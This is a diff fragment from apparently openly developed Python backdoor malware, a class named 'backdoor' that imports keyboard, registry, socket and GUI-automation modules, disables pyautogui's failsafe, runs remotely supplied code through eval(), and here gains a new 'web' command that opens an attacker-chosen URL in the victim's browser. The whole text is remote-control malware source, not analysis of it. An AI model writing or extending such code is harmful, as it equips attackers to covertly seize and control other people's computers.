@@ -1,5 +1,4 @@
-from codeop import CommandCompiler
-import sqlite3,socket,os,time,datetime,keyboard,winreg,pyautogui
+import sqlite3,socket,os,time,datetime,keyboard,winreg,pyautogui,webbrowser
 pyautogui.FAILSAFE = False
 class backdoor:
     def __init__(self):
@@ -121,6 +120,15 @@ class backdoor:
                     python_code += commands_to_execute[i+line] + "\n"
                 
                 output += eval(python_code)
+            elif command.startswith("web"):
+                browser_command = command.split("(")[1]
+                if len(browser_command) > 0:
+                    browser_command = browser_command.replace("(", "")
+                    browser_command = browser_command.replace(")", "")
+                    browser_command = browser_command.replace('"', '')
+                    webbrowser.open_new(browser_command)
+                else:
+                    output += "No argument provided\n"
             elif command.startswith("mouse"):
                 mouse_command = command.split(".")
                 if len(mouse_command) > 1:
